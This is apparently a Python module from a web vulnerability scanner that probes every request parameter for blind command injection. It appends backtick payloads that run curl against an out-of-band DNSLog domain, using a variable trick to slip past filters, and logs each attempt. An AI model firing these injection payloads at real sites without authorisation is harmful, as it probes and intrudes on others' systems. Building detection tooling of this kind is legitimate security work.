# coding: utf-8
"""
命令执行基础检测模块（无害化）
@Time :    4/5/2026
@Author:  facai
@File: rce.py
@Software: VSCode

功能说明：
1. 统一接口格式：接受HTTP请求JSON和参数列表JSON
2. 仅使用无害的DNSLog检测
3. 不执行任何实际系统命令
4. 无害化检测，不触发WAF
5. 使用 ParamHandler.set_param_value 修改参数（默认追加模式）

接口格式：
HTTP请求：
{
   "url": "http://127.0.0.1/test631?name=1",
   "method": "POST",
   "headers": {
       "User-Agent": "Mozilla/5.0"
   },
   "body": "aa=1&bb=a"
}

参数列表：
[
  {"param_name":"name", "param_value":"1", "param_type":"int", "position":"GET"},
  {"param_name":"aa", "param_value":"1", "param_type":"int", "position":"POST"},
  {"param_name":"bb", "param_value":"a", "param_type":"string", "position":"POST"}
]
"""

import time
import random
import string
import requests
from service.scaner.param_handler import ParamHandler
from service.libs.replay_request import send_http_request


class RCEScanner:
    """命令执行扫描器（无害化检测）"""
    
    def __init__(self, dnslog_domain=None, project_name=None, timeout=5):
        self.dnslog_domain = dnslog_domain
        self.project_name = project_name
        self.timeout = timeout
        self.param_handler = ParamHandler()
        
        # 仅使用无害的DNSLog payload
        self.payloads = [
            "`xcmm=curl;$xcmm {dnslog}`",
            "'`xcmm=curl;$xcmm {dnslog}`'",
            "\"`xcmm=curl;$xcmm {dnslog}`\"",
        ]
    
    def _generate_hash(self, length=5):
        """生成随机hash（字母+数字）"""
        chars = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
        return ''.join(random.choice(chars) for _ in range(length))
    
    def scan(self, request_data, params_list=None, send_request_func=None):
        """
        命令执行基础检测（无害化）
        
        Args:
            request_data: dict - HTTP请求数据
                {
                    "url": "http://127.0.0.1/test?name=1",
                    "method": "POST",
                    "headers": {"User-Agent": "Mozilla/5.0"},
                    "body": "aa=1&bb=a"
                }
            
            params_list: list - 参数列表（可选，如果为None则自动提取）
                [
                    {"param_name":"name", "param_value":"1", "param_type":"int", "position":"GET"},
                    {"param_name":"aa", "param_value":"1", "param_type":"int", "position":"POST"}
                ]
            
            send_request_func: function - 自定义发送请求函数（可选，如果为None则使用默认）
        
        Returns:
            list - 发现的漏洞列表
                [
                    {
                        'vuln_type': '命令执行疑似漏洞',
                        'rce_type': '无回显命令执行（需验证DNSLog）',
                        'param': 'name',
                        'position': 'GET',
                        'payload': '`xcmm=curl;$xcmm dnslog.com/l0g1r`',
                        'dnslog_id': 'l0g1r',
                        'evidence': '已发送DNSLog请求，请检查DNSLog平台是否收到请求',
                        'risk': '无风险-仅发送DNS查询请求'
                    }
                ]
        """
        vulnerabilities = []
        
        if not self.dnslog_domain:
            return vulnerabilities
        
        # 如果没有提供参数列表，自动提取参数
        if params_list is None:
            params_list = self.param_handler.callback_list_param(request_data)
        
        # 如果没有提供发送请求函数，使用默认
        if send_request_func is None:
            send_request_func = lambda req: send_http_request(req, timeout=self.timeout)
        
        # 遍历所有参数进行检测
        for param_info in params_list:
            for payload_template in self.payloads:
                try:
                    # 生成唯一的DNSLog标识（rce + 5位随机字母数字）
                    dnslog_id = f"rce{self._generate_hash(5)}"
                    
                    # 替换{hash}占位符构造dnslog域名
                    # dnslog_domain格式: "{hash}.www.dnslog.com"
                    dnslog_payload = self.dnslog_domain.replace('{hash}', dnslog_id)
                    
                    # 填充payload
                    payload = payload_template.format(dnslog=dnslog_payload)
                    
                    # 使用 ParamHandler.set_param_value 修改参数（追加模式）
                    test_request = self.param_handler.set_param_value(
                        request_data, 
                        param_info['param_name'], 
                        payload, 
                        mode=0  # 追加模式（在原值后面追加）
                    )
                    
                    # 发送请求
                    response = send_request_func(test_request)
                    
                    # 保存盲打日志到数据库（不返回结果，这是log）
                    if self.project_name:
                        try:
                            from database.vuln_log_database import VulnLogDatabase
                            vuln_log_db = VulnLogDatabase(self.project_name)
                            vuln_log_db.add_vuln_log(
                                vuln_hash=dnslog_id,
                                request_data=test_request,
                                param_name=param_info['param_name'],
                                vuln_type='rce'
                            )
                            print(f"[RCE Scanner] 已保存盲打日志: {dnslog_id}")
                        except Exception as e:
                            print(f"[RCE Scanner] 保存盲打日志失败: {e}")
                    
                    # 不添加到 vulnerabilities，RCE盲打只记录日志
                    
                except Exception as e:
                    continue
        
        return vulnerabilities



if __name__ == "__main__":
    # 测试代码
    scanner = RCEScanner(dnslog_domain="{hash}.dnslog.com", project_name="test")
    
    # 测试HTTP请求
    test_request = {
        "url": "http://127.0.0.1/test631?cmd=test",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "body": "command=ls"
    }
    
    print("命令执行扫描器测试")
    print(f"HTTP请求: {test_request}")
    print("\n开始扫描...")
    
    # 执行扫描（自动提取参数）
    results = scanner.scan(test_request)
    
    print(f"\n发现 {len(results)} 个潜在漏洞:")
    for vuln in results:
        print(f"  [{vuln['vuln_type']}] {vuln['param']} - {vuln['payload']}")
        print(f"    DNSLog ID: {vuln['dnslog_id']}")
        print(f"    DNSLog Payload: {vuln['dnslog_payload']}")
        print(f"    证据: {vuln['evidence']}")
